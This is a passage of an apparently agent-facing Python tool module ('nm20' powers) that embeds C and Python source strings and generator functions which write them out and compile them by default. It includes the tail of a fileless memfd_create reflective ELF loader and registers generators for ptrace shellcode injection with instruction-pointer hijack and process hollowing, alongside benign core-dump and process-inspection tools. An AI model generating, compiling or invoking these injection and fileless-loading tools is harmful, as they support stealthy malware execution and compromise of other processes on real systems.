    unsigned char *buf = malloc(sz);
    if (read(fd, buf, sz) != sz) { perror("read"); return 1; }
    close(fd);
    if (memcmp(buf, "\x7f""ELF", 4)) { fprintf(stderr, "not ELF\n"); return 1; }

    int mfd = syscall(SYS_memfd_create, "nm20_reflective", MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); return 1; }
    if (write(mfd, buf, sz) != sz) { perror("write"); return 1; }
    fprintf(stderr, "[reflective] %lld bytes staged in memfd %d (anon, no filesystem)\n",
            (long long)sz, mfd);

    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", mfd);
    execv(path, &argv[2]);
    perror("execv");
    return 1;
}
"""

_CORE_ANALYZER_PY = r"""#!/usr/bin/env python3
'''nm20.mem.core_dump_analyzer - parse ELF core notes (NT_PRSTATUS/NT_PRPSINFO) stdlib-only.'''
import json, struct, sys

def main(path):
    d = open(path, "rb").read()
    if d[:4] != b"\x7fELF":
        print(json.dumps({"ok": False, "error": "not an ELF core"})); return 1
    is64 = d[4] == 2
    end = "<" if d[5] != 2 else ">"
    if is64:
        (_, _, _, _, phoff, _, _, _, phentsize, phnum, _, _, _) = struct.unpack_from(
            end + "HHIQQQIHHHHHH", d, 16)
        phfmt, phsz = end + "IIQQQQQQ", 56
    else:
        (_, _, _, _, phoff, _, _, _, phentsize, phnum, _, _, _) = struct.unpack_from(
            end + "HHIIIIIHHHHHH", d, 16)
        phfmt, phsz = end + "IIIIIIII", 32
    notes, loads = [], []
    for i in range(phnum):
        vals = struct.unpack_from(phfmt, d, phoff + i * phsz)
        if is64:
            p_type, p_flags, p_off, p_vaddr, _, p_filesz, p_memsz, _ = vals
        else:
            p_type, p_off, p_vaddr, _, p_filesz, p_memsz, p_flags, _ = vals
        if p_type == 4:
            notes.append((p_off, p_filesz))
        elif p_type == 1:
            loads.append({"vaddr": hex(p_vaddr), "filesz": p_filesz, "memsz": p_memsz})
    out = {"ok": True, "path": path, "load_segments": len(loads), "notes": []}
    names = {1: "NT_PRSTATUS", 2: "NT_FPREGSET", 3: "NT_PRPSINFO", 4: "NT_TASKSTRUCT",
             0x53494749: "NT_SIGINFO", 0x46e62b7f: "NT_386_TLS"}
    for off, size in notes:
        p = off
        while p + 12 <= off + size:
            n_namesz, n_descsz, n_type = struct.unpack_from(end + "III", d, p)
            p += 12
            name = d[p:p + n_namesz].rstrip(b"\x00").decode("utf-8", "replace")
            p += (n_namesz + 3) & ~3
            desc = d[p:p + n_descsz]
            p += (n_descsz + 3) & ~3
            rec = {"owner": name, "type": names.get(n_type, hex(n_type)),
                   "desc_size": n_descsz}
            if name == "CORE" and n_type == 3 and n_descsz >= 28:  # PRPSINFO
                fnam = desc[12:28].split(b"\x00")[0]
                rec["process_fname"] = fnam.decode("utf-8", "replace")
            out["notes"].append(rec)
    print(json.dumps(out, indent=2))
    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv[1] if len(sys.argv) > 1 else "/tmp/core"))
"""


def _generator_power(args, power, src_name, src, lang, summary):
    """Shared generator body: always writes the real artifact; compiles only when armed."""
    artifact = _write_artifact(src_name, src)
    result = _result(True, power, armed=bool(args.get("arm", True)),
                     generator=True, language=lang, summary=summary,
                     artifact=artifact,
                     would_do=_WOULD_DO[power])
    if args.get("arm", True):
        if lang == "c":
            out_bin = artifact["path"].rsplit(".", 1)[0]
            result["compile"] = _maybe_compile(artifact["path"], out_bin)
        else:
            result["execute"] = {"skipped": False,
                                 "note": "python artifact is runnable: python3 %s <core>" % artifact["path"]}
    else:
        result["note"] = "artifact written; pass {'arm': true} to compile (needs cc)"
    return result


_WOULD_DO = {
    "nm20.proc.syscall_tracer": "PTRACE_ATTACH target, PTRACE_SYSCALL loop, log orig_rax/args, detach",
    "nm20.proc.process_injector_gen": "PTRACE_ATTACH, remote mmap via injected syscall stub, POKETEXT shellcode, hijack RIP, detach",
    "nm20.proc.hollowing_gen": "fork+TRACEME host, stop at exec, overwrite host image with payload ELF bytes, transfer control",
    "nm20.proc.reflective_loader_gen": "memfd_create anonymous backing, stage ELF in memory, exec via /proc/self/fd (no disk drop)",
    "nm20.mem.core_dump_analyzer_gen": "parse ELF core PT_NOTE segments (NT_PRSTATUS/NT_PRPSINFO) with stdlib struct",
}


def proc_syscall_tracer(args):
    """Generate real ptrace strace-like C tracer artifact; arm:true compiles it with cc."""
    return _generator_power(args, "nm20.proc.syscall_tracer",
                            "nm20_syscall_tracer.c", _TRACER_C, "c",
                            "strace-like ptrace syscall tracer for Linux x86-64")


def proc_process_injector_gen(args):
    """Generate real ptrace shellcode-injection C source artifact; arm:true compiles it."""
    return _generator_power(args, "nm20.proc.process_injector_gen",
                            "nm20_process_injector.c", _INJECTOR_C, "c",
                            "ptrace RIP-hijack remote-mmap shellcode injector (x86-64)")


def proc_hollowing_gen(args):
    """Generate real process-hollowing C source artifact (fork/TRACEME/image-overwrite)."""
    return _generator_power(args, "nm20.proc.hollowing_gen",
                            "nm20_hollowing.c", _HOLLOWING_C, "c",
                            "ptrace-based process hollowing: host image overwritten in memory")


def proc_reflective_loader_gen(args):
    """Generate real reflective-loader C source (memfd_create + exec from memory)."""
    return _generator_power(args, "nm20.proc.reflective_loader_gen",
                            "nm20_reflective_loader.c", _REFLECTIVE_C, "c",
                            "fileless ELF loader: memfd_create + /proc/self/fd exec")


def mem_core_dump_analyzer_gen(args):
    """Generate real stdlib-python ELF core-dump analyzer artifact (parses PT_NOTE)."""
    return _generator_power(args, "nm20.mem.core_dump_analyzer_gen",
                            "nm20_core_analyzer.py", _CORE_ANALYZER_PY, "python",
                            "ELF core note parser (NT_PRSTATUS/NT_PRPSINFO)")


POWERS = {
    "nm20.proc.maps_reader": proc_maps_reader,
    "nm20.proc.mem_read": proc_mem_read,
    "nm20.mem.heap_inspector": mem_heap_inspector,
    "nm20.mem.stack_snapshot": mem_stack_snapshot,
    "nm20.proc.fd_walker": proc_fd_walker,
    "nm20.proc.environ_reader": proc_environ_reader,
    "nm20.proc.thread_lister": proc_thread_lister,
    "nm20.proc.syscall_tracer": proc_syscall_tracer,
    "nm20.proc.process_injector_gen": proc_process_injector_gen,
    "nm20.proc.hollowing_gen": proc_hollowing_gen,
    "nm20.proc.reflective_loader_gen": proc_reflective_loader_gen,
    "nm20.mem.got_plt_parser": mem_got_plt_parser,
    "nm20.mem.elf_section_dump": mem_elf_section_dump,
    "nm20.mem.rwx_hunter": mem_rwx_hunter,
    "nm20.mem.aslr_report": mem_aslr_report,
    "nm20.mem.core_dump_analyzer_gen": mem_core_dump_analyzer_gen,
    "nm20.proc.seccomp_dump": proc_seccomp_dump,
    "nm20.proc.capability_decode": proc_capability_decode,
    "nm20.proc.zombie_reaper_report": proc_zombie_reaper_report,
    "nm20.proc.oom_score_audit": proc_oom_score_audit,
    "nm20.proc.cgroup_limits": proc_cgroup_limits,
}


if __name__ == "__main__":
    print(json.dumps(POWERS["nm20.proc.maps_reader"]({"limit": 4}), indent=2))
